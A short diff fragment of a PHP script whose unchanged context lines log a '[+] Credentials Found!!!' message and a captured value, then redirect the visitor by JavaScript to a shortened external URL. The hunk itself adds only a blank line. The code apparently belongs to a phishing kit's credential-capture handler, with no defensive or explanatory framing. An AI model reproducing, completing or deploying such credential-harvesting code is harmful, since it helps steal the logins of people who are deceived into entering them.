@@ -6,3 +6,4 @@ error_log("[+] Credentials Found!!!");
 error_log("$res");
 echo "<script type='text/javascript'>window.location='https://shorturl.ae/WNpcJ'</script>";
 ?>
+
